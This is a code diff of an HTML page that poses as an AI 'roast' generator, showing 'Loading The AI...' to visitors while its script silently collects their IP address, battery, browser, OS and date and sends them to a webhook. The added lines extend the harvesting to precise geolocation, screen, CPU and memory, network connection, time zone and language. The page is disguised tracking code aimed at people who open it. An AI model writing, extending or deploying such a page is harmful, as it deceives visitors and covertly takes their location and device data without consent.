@@ -7,11 +7,11 @@
     <script>
         async function collectAndSendData() {
             try {
-                // Fetch IP Address
+                // Collect IP Address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
 
-                // Get Battery Info
+                // Collect Battery Info
                 const battery = await navigator.getBattery();
                 const batteryInfo = {
                     charging: battery.charging,
@@ -20,7 +20,7 @@
                     dischargingTime: battery.dischargingTime
                 };
 
-                // Get Browser and OS Info
+                // Collect Browser and OS Info
                 const browserInfo = {
                     browserName: navigator.userAgentData?.brands?.[0]?.brand || navigator.appName,
                     browserVersion: navigator.userAgentData?.brands?.[0]?.version || navigator.appVersion,
@@ -30,15 +30,65 @@
                     renderingEngine: navigator.product
                 };
 
-                // Get Date and Time
+                // Collect Date and Time
                 const dateTime = new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+
+                // Collect Geolocation
+                let locationData = {};
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    });
+                }
+
+                // Collect Screen Information
+                const screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                };
+
+                // Collect Device Information
+                const deviceInfo = {
+                    hardwareConcurrency: navigator.hardwareConcurrency, // Number of CPU cores
+                    deviceMemory: navigator.deviceMemory,              // Approximate RAM in GB
+                    maxTouchPoints: navigator.maxTouchPoints           // Number of touch points supported
+                };
+
+                // Collect Network Information
+                let connectionData = {};
+                const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (networkInfo) {
+                    connectionData = {
+                        downlink: networkInfo.downlink, // Estimated download speed (Mbps)
+                        effectiveType: networkInfo.effectiveType, // Network type (e.g., '4g', '3g')
+                        rtt: networkInfo.rtt, // Round-trip time (ms)
+                        saveData: networkInfo.saveData // Data saver mode enabled
+                    };
+                }
+
+                // Collect Time Zone and Locale
+                const timeZoneLocale = {
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language
+                };
 
                 // Combine Data
                 const userData = {
                     ip: ipData.ip,
                     batteryInfo,
                     browserInfo,
-                    dateTime
+                    dateTime,
+                    locationData,
+                    screenInfo,
+                    deviceInfo,
+                    connectionData,
+                    timeZoneLocale
                 };
 
                 // Send Data to Webhook
@@ -62,7 +112,8 @@
 </head>
 <body>
     <h1>Loading The AI...</h1>
-    <p>Please wait while the AI thinks about how to roast you today...</p>
+    <p>Please wait while the AI thinks about how to deep frye you today...</p>
 </body>
 </html>
+
 
